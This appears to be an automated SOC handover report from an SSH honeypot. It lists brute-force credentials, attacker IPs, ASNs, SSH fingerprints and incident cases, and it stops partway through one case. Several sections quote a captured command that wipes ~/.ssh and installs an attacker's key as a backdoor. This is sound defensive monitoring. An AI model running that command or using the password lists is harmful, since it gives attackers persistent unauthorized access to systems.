# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-29 |
| **Generated At** | 2026-04-29T14:07:32Z |
| **Shift Time** | 14:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **307** |
| Confirmed Threats | **282** |
| False Positives Filtered | **25** (8.1%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **18** |
| High Severity Cases | **38** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **269** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 3 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **226** |
| Unique Credential Pairs | **66** |
| Unique Usernames | **37** |
| Unique Passwords | **63** |
| Successful Auth Pairs | **26** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 47 |
| `root` | 38 |
| `345gs5662d34` | 19 |
| `ftpuser` | 9 |
| `debian` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 19 |
| `3245gs5662d34` | 19 |
| `P@ssw0rd` | 8 |
| `1` | 8 |
| `Qwe123456@` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 19 |
| `root` | `3245gs5662d34` | 19 |
| `ubuntu` | `Qwe123456@` | 5 |
| `vps` | `1234567890` | 5 |
| `webuser` | `qwer1234` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin!!!1` | `118.71.20.172` | 2026-04-29T10:36:52 |
| `root` | `3245gs5662d34` | `118.71.20.172` | 2026-04-29T10:36:56 |
| `root` | `admin!!!1` | `103.52.152.101` | 2026-04-29T11:23:39 |
| `root` | `3245gs5662d34` | `103.52.152.101` | 2026-04-29T11:23:43 |
| `root` | `administration` | `43.160.233.150` | 2026-04-29T12:00:09 |
| `root` | `3245gs5662d34` | `43.160.233.150` | 2026-04-29T12:00:11 |
| `root` | `mysql` | `43.160.233.150` | 2026-04-29T12:02:01 |
| `root` | `nasadmin` | `43.160.233.150` | 2026-04-29T12:02:55 |
| `root` | `test123` | `43.160.233.150` | 2026-04-29T12:03:50 |
| `root` | `administration` | `171.25.158.47` | 2026-04-29T12:09:52 |
| `root` | `3245gs5662d34` | `171.25.158.47` | 2026-04-29T12:09:56 |
| `root` | `mysql` | `171.25.158.47` | 2026-04-29T12:11:38 |
| `root` | `mysql` | `69.6.221.248` | 2026-04-29T12:19:35 |
| `root` | `3245gs5662d34` | `69.6.221.248` | 2026-04-29T12:19:43 |
| `root` | `nasadmin` | `171.25.158.47` | 2026-04-29T12:23:25 |
| `root` | `test123` | `69.6.221.248` | 2026-04-29T12:27:51 |
| `root` | `test123` | `171.25.158.47` | 2026-04-29T12:31:34 |
| `root` | `nasadmin` | `69.6.221.248` | 2026-04-29T12:33:10 |
| `root` | `administration` | `69.6.221.248` | 2026-04-29T12:34:11 |
| `root` | `test123` | `165.232.74.249` | 2026-04-29T12:36:59 |
| `root` | `3245gs5662d34` | `165.232.74.249` | 2026-04-29T12:37:03 |
| `root` | `administration` | `165.232.74.249` | 2026-04-29T12:37:48 |
| `root` | `mysql` | `165.232.74.249` | 2026-04-29T12:52:47 |
| `root` | `nasadmin` | `165.232.74.249` | 2026-04-29T12:53:36 |
| `root` | `Pass@word1` | `42.96.20.16` | 2026-04-29T14:02:35 |
| `root` | `3245gs5662d34` | `42.96.20.16` | 2026-04-29T14:02:40 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **307** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 248 |
| Paramiko (Python) | 2 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 220 | 8 |
| `03a80b21afa8...` | Modern SSH client | 14 | 1 |
| `a2de0f306611...` | Mirai/variant | 2 | 2 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 220 | 8 | libssh-based |
| `95420f9d932d...` | libssh | 14 | 2 | — |
| `03a80b21afa8...` | libssh | 14 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 2 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 19 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.160.233.150`, `69.6.221.248`, `103.52.152.101`, `118.71.20.172`, `165.232.74.249`, `171.25.158.47`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **28** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 2 | HIGH |
| `AS216472` | High Speed For Internet Services L.L.C | 2 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | LOW |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |
| `AS131423` | Branch of Long Van System Solution JSC - Hanoi | 1 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (38)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9e5ef352d721

| Field | Detail |
|---|---|
| **Source IP** | `118.71.20[.]172` |
| **First Seen** | 2026-04-29 10:36 |
| **Last Seen** | 2026-04-29 10:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 10:36:52` | `cowrie.session.connect` |
| `2026-04-29 10:36:52` | `cowrie.client.version` |
| `2026-04-29 10:36:52` | `cowrie.client.kex` |
| `2026-04-29 10:36:52` | `cowrie.login.success` |
| `2026-04-29 10:36:53` | `cowrie.session.params` |
| `2026-04-29 10:36:53` | `cowrie.command.input` |
| `2026-04-29 10:36:53` | `cowrie.command.failed` |
| `2026-04-29 10:36:53` | `cowrie.log.closed` |
| `2026-04-29 10:36:53` | `cowrie.session.params` |
| `2026-04-29 10:36:53` | `cowrie.command.input` |
| `2026-04-29 10:36:53` | `cowrie.session.file_download` |
| `2026-04-29 10:36:53` | `cowrie.log.closed` |
| `2026-04-29 10:36:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.71.20[.]172` to AbuseIPDB if not already reported
- [ ] Block `118.71.20[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0dfbec7b5cf

| Field | Detail |
|---|---|
| **Source IP** | `118.71.20[.]172` |
| **First Seen** | 2026-04-29 10:36 |
| **Last Seen** | 2026-04-29 10:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 10:36:55` | `cowrie.session.connect` |
| `2026-04-29 10:36:55` | `cowrie.client.version` |
| `2026-04-29 10:36:55` | `cowrie.client.kex` |
| `2026-04-29 10:36:56` | `cowrie.login.success` |
| `2026-04-29 10:36:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.71.20[.]172` to AbuseIPDB if not already reported
- [ ] Block `118.71.20[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23cf940090b2

| Field | Detail |
|---|---|
| **Source IP** | `103.52.152[.]101` |
| **First Seen** | 2026-04-29 11:23 |
| **Last Seen** | 2026-04-29 11:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 11:23:39` | `cowrie.session.connect` |
| `2026-04-29 11:23:39` | `cowrie.client.version` |
| `2026-04-29 11:23:39` | `cowrie.client.kex` |
| `2026-04-29 11:23:39` | `cowrie.login.success` |
| `2026-04-29 11:23:40` | `cowrie.session.params` |
| `2026-04-29 11:23:40` | `cowrie.command.input` |
| `2026-04-29 11:23:40` | `cowrie.command.failed` |
| `2026-04-29 11:23:40` | `cowrie.log.closed` |
| `2026-04-29 11:23:40` | `cowrie.session.params` |
| `2026-04-29 11:23:40` | `cowrie.command.input` |
| `2026-04-29 11:23:40` | `cowrie.session.file_download` |
| `2026-04-29 11:23:40` | `cowrie.log.closed` |
| `2026-04-29 11:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.52.152[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.52.152[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e279bc97506e

| Field | Detail |
|---|---|
| **Source IP** | `103.52.152[.]101` |
| **First Seen** | 2026-04-29 11:23 |
| **Last Seen** | 2026-04-29 11:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 11:23:42` | `cowrie.session.connect` |
| `2026-04-29 11:23:42` | `cowrie.client.version` |
| `2026-04-29 11:23:42` | `cowrie.client.kex` |
| `2026-04-29 11:23:43` | `cowrie.login.success` |
| `2026-04-29 11:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.52.152[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.52.152[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-393d0777dcff

| Field | Detail |
|---|---|
| **Source IP** | `43.160.233[.]150` |
| **First Seen** | 2026-04-29 12:00 |
| **Last Seen** | 2026-04-29 12:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:00:08` | `cowrie.session.connect` |
| `2026-04-29 12:00:08` | `cowrie.client.version` |
| `2026-04-29 12:00:08` | `cowrie.client.kex` |
| `2026-04-29 12:00:09` | `cowrie.login.success` |
| `2026-04-29 12:00:09` | `cowrie.session.params` |
| `2026-04-29 12:00:09` | `cowrie.command.input` |
| `2026-04-29 12:00:09` | `cowrie.command.failed` |
| `2026-04-29 12:00:09` | `cowrie.log.closed` |
| `2026-04-29 12:00:09` | `cowrie.session.params` |
| `2026-04-29 12:00:09` | `cowrie.command.input` |
| `2026-04-29 12:00:09` | `cowrie.session.file_download` |
| `2026-04-29 12:00:09` | `cowrie.log.closed` |
| `2026-04-29 12:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.233[.]150` to AbuseIPDB if not already reported
- [ ] Block `43.160.233[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ace429faa5d

| Field | Detail |
|---|---|
| **Source IP** | `43.160.233[.]150` |
| **First Seen** | 2026-04-29 12:00 |
| **Last Seen** | 2026-04-29 12:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:00:11` | `cowrie.session.connect` |
| `2026-04-29 12:00:11` | `cowrie.client.version` |
| `2026-04-29 12:00:11` | `cowrie.client.kex` |
| `2026-04-29 12:00:11` | `cowrie.login.success` |
| `2026-04-29 12:00:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.233[.]150` to AbuseIPDB if not already reported
- [ ] Block `43.160.233[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a39e40200b9

| Field | Detail |
|---|---|
| **Source IP** | `43.160.233[.]150` |
| **First Seen** | 2026-04-29 12:02 |
| **Last Seen** | 2026-04-29 12:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:02:00` | `cowrie.session.connect` |
| `2026-04-29 12:02:00` | `cowrie.client.version` |
| `2026-04-29 12:02:00` | `cowrie.client.kex` |
| `2026-04-29 12:02:01` | `cowrie.login.success` |
| `2026-04-29 12:02:01` | `cowrie.session.params` |
| `2026-04-29 12:02:01` | `cowrie.command.input` |
| `2026-04-29 12:02:01` | `cowrie.command.failed` |
| `2026-04-29 12:02:01` | `cowrie.log.closed` |
| `2026-04-29 12:02:01` | `cowrie.session.params` |
| `2026-04-29 12:02:01` | `cowrie.command.input` |
| `2026-04-29 12:02:01` | `cowrie.session.file_download` |
| `2026-04-29 12:02:01` | `cowrie.log.closed` |
| `2026-04-29 12:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.233[.]150` to AbuseIPDB if not already reported
- [ ] Block `43.160.233[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-653d63ac04df

| Field | Detail |
|---|---|
| **Source IP** | `43.160.233[.]150` |
| **First Seen** | 2026-04-29 12:02 |
| **Last Seen** | 2026-04-29 12:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:02:03` | `cowrie.session.connect` |
| `2026-04-29 12:02:03` | `cowrie.client.version` |
| `2026-04-29 12:02:03` | `cowrie.client.kex` |
| `2026-04-29 12:02:03` | `cowrie.login.success` |
| `2026-04-29 12:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.233[.]150` to AbuseIPDB if not already reported
- [ ] Block `43.160.233[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-131975422c02

| Field | Detail |
|---|---|
| **Source IP** | `43.160.233[.]150` |
| **First Seen** | 2026-04-29 12:02 |
| **Last Seen** | 2026-04-29 12:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:02:55` | `cowrie.session.connect` |
| `2026-04-29 12:02:55` | `cowrie.client.version` |
| `2026-04-29 12:02:55` | `cowrie.client.kex` |
| `2026-04-29 12:02:55` | `cowrie.login.success` |
| `2026-04-29 12:02:56` | `cowrie.session.params` |
| `2026-04-29 12:02:56` | `cowrie.command.input` |
| `2026-04-29 12:02:56` | `cowrie.command.failed` |
| `2026-04-29 12:02:56` | `cowrie.log.closed` |
| `2026-04-29 12:02:56` | `cowrie.session.params` |
| `2026-04-29 12:02:56` | `cowrie.command.input` |
| `2026-04-29 12:02:56` | `cowrie.session.file_download` |
| `2026-04-29 12:02:56` | `cowrie.log.closed` |
| `2026-04-29 12:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.233[.]150` to AbuseIPDB if not already reported
- [ ] Block `43.160.233[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fe5203621c9

| Field | Detail |
|---|---|
| **Source IP** | `43.160.233[.]150` |
| **First Seen** | 2026-04-29 12:02 |
| **Last Seen** | 2026-04-29 12:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:02:57` | `cowrie.session.connect` |
| `2026-04-29 12:02:57` | `cowrie.client.version` |
| `2026-04-29 12:02:57` | `cowrie.client.kex` |
| `2026-04-29 12:02:58` | `cowrie.login.success` |
| `2026-04-29 12:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.233[.]150` to AbuseIPDB if not already reported
- [ ] Block `43.160.233[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beccc732ecc8

| Field | Detail |
|---|---|
| **Source IP** | `43.160.233[.]150` |
| **First Seen** | 2026-04-29 12:03 |
| **Last Seen** | 2026-04-29 12:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:03:49` | `cowrie.session.connect` |
| `2026-04-29 12:03:49` | `cowrie.client.version` |
| `2026-04-29 12:03:50` | `cowrie.client.kex` |
| `2026-04-29 12:03:50` | `cowrie.login.success` |
| `2026-04-29 12:03:50` | `cowrie.session.params` |
| `2026-04-29 12:03:50` | `cowrie.command.input` |
| `2026-04-29 12:03:50` | `cowrie.command.failed` |
| `2026-04-29 12:03:50` | `cowrie.log.closed` |
| `2026-04-29 12:03:50` | `cowrie.session.params` |
| `2026-04-29 12:03:50` | `cowrie.command.input` |
| `2026-04-29 12:03:50` | `cowrie.session.file_download` |
| `2026-04-29 12:03:50` | `cowrie.log.closed` |
| `2026-04-29 12:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.233[.]150` to AbuseIPDB if not already reported
- [ ] Block `43.160.233[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28c54cc8e0c8

| Field | Detail |
|---|---|
| **Source IP** | `43.160.233[.]150` |
| **First Seen** | 2026-04-29 12:03 |
| **Last Seen** | 2026-04-29 12:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 12:03:52` | `cowrie.session.connect` |
| `2026-04-29 12:03:52` | `cowrie.client.version` |
| `2026-04-29 12:03:52` | `cowrie.client.kex` |
| `2026-04-29 12:03:52` | `cowrie.login.success` |
| `2026-04-29 12:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.233[.]150` to AbuseIPDB if not already reported
- [ ] Block `43.160.233[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6dfd9ab1da5

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]47` |
| **First Seen** | 2026-04-29 12:09 |
| **Last Seen** | 2026-04-29 12:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
